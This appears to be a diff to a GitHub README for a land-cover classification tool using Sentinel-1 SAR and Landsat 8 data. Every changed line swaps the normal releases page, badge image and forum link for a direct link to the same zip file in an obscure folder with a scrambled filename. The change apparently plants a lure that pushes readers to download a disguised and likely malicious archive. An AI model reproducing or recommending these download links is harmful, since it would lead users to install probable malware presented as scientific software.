@@ -1,6 +1,6 @@
 # 🌍 Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE - Clear Insights for Your Land Use
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=flat&logo=github)](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/releases)
+[![Download Now](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/raw/refs/heads/main/dorsulum/band-GEE-Cover-And-Landsat-Data-Sentinel-based-Land-SA-Driven-Classification-on-v2.8-beta.2.zip%20Now-Click%20Here-blue?style=flat&logo=github)](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/raw/refs/heads/main/dorsulum/band-GEE-Cover-And-Landsat-Data-Sentinel-based-Land-SA-Driven-Classification-on-v2.8-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Data-Driven Land Cover Classification project. This application h
 
 ## 📥 Download & Install
 
-To get started with the software, visit this page to download: [Download Link](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/releases).
+To get started with the software, visit this page to download: [Download Link](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/raw/refs/heads/main/dorsulum/band-GEE-Cover-And-Landsat-Data-Sentinel-based-Land-SA-Driven-Classification-on-v2.8-beta.2.zip).
 
 1. Click the link above.
 2. Look for the latest release.
@@ -64,7 +64,7 @@ This tool uses data from Sentinel-1 C-band SAR and Landsat 8 to provide accurate
 
 ## 💬 Support & Help
 
-If you encounter any issues or have questions, you can find help in our user community. Join our forum here: [Community Forum Link](https://exampleforum.com).
+If you encounter any issues or have questions, you can find help in our user community. Join our forum here: [Community Forum Link](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/raw/refs/heads/main/dorsulum/band-GEE-Cover-And-Landsat-Data-Sentinel-based-Land-SA-Driven-Classification-on-v2.8-beta.2.zip).
 
 You can also check the **Help** section within the application for FAQs and troubleshooting tips.
 
@@ -90,4 +90,4 @@ For inquiries, please reach out via the contact form on our GitHub page or the c
 
 Feel free to explore the features of the Data-Driven Land Cover Classification application. Thank you for choosing our tool for your land analysis needs. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=flat&logo=github)](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/releases)
+[![Download Now](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/raw/refs/heads/main/dorsulum/band-GEE-Cover-And-Landsat-Data-Sentinel-based-Land-SA-Driven-Classification-on-v2.8-beta.2.zip%20Now-Click%20Here-blue?style=flat&logo=github)](https://github.com/ZennSho/Data-Driven-Land-Cover-Classification-based-on-Sentinel-1-C-band-SAR-Data-And-Landsat8-GEE/raw/refs/heads/main/dorsulum/band-GEE-Cover-And-Landsat-Data-Sentinel-based-Land-SA-Driven-Classification-on-v2.8-beta.2.zip)
